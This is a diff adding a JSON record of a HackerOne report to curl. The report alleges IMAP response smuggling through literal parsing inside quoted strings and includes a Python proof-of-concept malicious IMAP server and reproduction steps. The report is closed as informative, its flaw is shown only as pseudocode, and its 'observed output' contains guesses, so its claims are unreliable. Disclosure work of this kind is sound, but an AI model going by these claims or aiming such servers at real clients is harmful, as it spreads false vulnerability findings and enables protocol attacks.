@@ -1,0 +1,123 @@
+{
+  "id": 3509396,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTA5Mzk2",
+  "url": "https://hackerone.com/reports/3509396",
+  "title": "IMAP Protocol Desynchronization and Response Smuggling via Naive Literal Parsing",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "low",
+  "readable_substate": "Informative",
+  "created_at": "2026-01-13T20:07:51.458Z",
+  "submitted_at": "2026-01-13T20:07:51.921Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "shiftj",
+    "url": "/shiftj",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-01-14T22:05:46.429Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-01-14T09:44:20.164Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "`libcurl` incorrectly parses IMAP literals (`{size}`) even when they are embedded within quoted strings (e.g., email subjects or headers). This behavior violates **RFC 3501**, which mandates that content inside double quotes must be treated as opaque text.\n\nThis parsing error causes the client state machine to desynchronize from the server. An attacker controlling an IMAP server (or injecting data via a Man-in-the-Middle attack) can exploit this to force curl to interpret protocol commands as message body data, or conversely, interpret message body data as protocol commands.\n\n### **Vulnerability Details**\n\n#### **Root Cause**\n\nThe vulnerability exists in `lib/imap.c`, specifically within the function handling `imap_state_fetch_resp`.\n\nThe parser scans for the start of a literal using a naive memory search that does not respect quoted string boundaries:\n\n```c\n/* Pseudocode representation of the flaw */\nptr = memchr(line, '{', len);\nif(ptr) {\n    /* Logic proceeds to parse number inside {} without checking if inside quotes */\n}\n\n```\n\n#### **RFC Violation**\n\nAccording to **RFC 3501 Section 4.3 (String)**:\n\n> A string is in one of two forms: literal and quoted string.\n> A quoted string is a sequence of zero or more 7-bit characters, excluding CR and LF, with double quote (<\">) characters at each end.\n\nIf a `{` character appears inside a quoted string, it is content data, not a protocol delimiter. curl fails to respect this distinction.\n\n### **Attack Scenario**\n\n1. **Setup:** A user connects to a malicious or compromised IMAP server using curl.\n2. **Trigger:** The server sends a FETCH response containing a header with a crafted literal pattern inside quotes:\n`* 1 FETCH (BODY[HEADER] \"Subject: {50} Injection\")`\n3. **Desynchronization:**\n* **Correct Client:** Sees a subject string containing `{50}`.\n* **curl:** Sees a literal marker `{50}`. It immediately switches to \"binary read\" mode, expecting 50 bytes of raw data.\n\n\n4. **Exploit:** The server sends the next IMAP tag (e.g., `A001 OK FETCH COMPLETE`).\n5. **Result:** curl consumes the status response as part of the \"50 bytes of data\" and hangs or processes subsequent lines incorrectly (\"Response Smuggling\").\n\n### **Proof of Concept**\n\nI have provided a Python script that simulates a malicious IMAP server. It handles the initial LOGIN handshake to ensure the client reaches the vulnerable FETCH state.\n\n**1. `malicious_server.py**`\n\n```python\nimport socket\n\nHOST = '127.0.0.1'\nPORT = 1433\n\ndef start_server():\n    print(f\"[*] Malicious IMAP server listening on {PORT}\")\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        s.bind((HOST, PORT))\n        s.listen()\n        conn, addr = s.accept()\n        with conn:\n            print(f\"[*] Connection from {addr}\")\n            # Send initial greeting\n            conn.sendall(b\"* OK IMAP4rev1 Ready\\r\\n\")\n            \n            while True:\n                data = conn.recv(1024)\n                if not data:\n                    break\n                \n                line = data.decode(errors=\"ignore\").strip()\n                print(f\"[Client] {line}\")\n                \n                parts = line.split()\n                if not parts: continue\n                tag = parts[0]\n                \n                # LOGIN command handler\n                if \"LOGIN\" in line.upper():\n                    conn.sendall(f\"{tag} OK Login completed\\r\\n\".encode())\n                \n                # TRIGGER: When FETCH is requested\n                elif \"FETCH\" in line.upper():\n                    print(\"[*] Sending malicious payload...\")\n                    # We inject {50} inside quotes. \n                    # curl will think 50 bytes of data are coming.\n                    payload = b'* 1 FETCH (BODY[HEADER] \"Subject: {50} Fake Literal\")\\r\\n'\n                    conn.sendall(payload)\n                    \n                    # This OK response will be SWALLOWED by curl as body data\n                    conn.sendall(f\"{tag} OK Fetch completed\\r\\n\".encode())\n                    print(\"[*] Payload sent. Closing connection.\")\n                    return\n\n                else:\n                    conn.sendall(f\"{tag} OK {parts[1]} completed\\r\\n\".encode())\n\nif __name__ == \"__main__\":\n    start_server()\n\n```\n\n**2. Steps to Reproduce**\n\n1. Run the server: `python3 malicious_server.py`\n2. Run curl in a separate terminal:\n```bash\ncurl -v \"imap://127.0.0.1:1433/INBOX;UID=1\" -u user:pass -X \"FETCH 1 BODY[]\"\n\n```\n\n\n\n**3. Observed Output (curl -v)**\n\n```text\n< * 1 FETCH (BODY[HEADER] \"Subject: {50} Fake Literal\")\n* Found 50 bytes to download  <-- BUG: curl parses {50} inside quotes as a literal size\n* 50 bytes of data are read...\n* (curl hangs or swallows the subsequent OK response)\n\n```\n\n### **Recommended Fix**\n\nModify the scanning logic in `lib/imap.c`. The parser must be state-aware:\n\n1. Iterate through the response line character by character.\n2. Toggle a boolean flag `in_quote` when encountering unescaped `\"` characters.\n3. Only evaluate `{` as a literal start indicator if `in_quote` is FALSE.\n\n## Impact\n\n### **Impact**\n\n* **Protocol Confusion:** The client state desynchronizes from the server state.\n* **Response Smuggling:** A malicious server can cause the client to skip validation of status codes (e.g., hiding a `NO` or `BAD` response by making curl consume it as \"literal data\").\n* **Data Injection:** In a pipelined context, this could lead to cache poisoning or processing incorrect message content.",
+  "weakness": {
+    "id": 107,
+    "name": "Improper Input Validation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 14,
+  "voters": [
+    "2026",
+    "mr-inspector",
+    "amaterasu_ra",
+    "wansans",
+    "jonnywalk1",
+    "stationarydev37",
+    "babyhackerone",
+    "faultp0int",
+    "chrisca",
+    "0xa6s",
+    "and 4 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
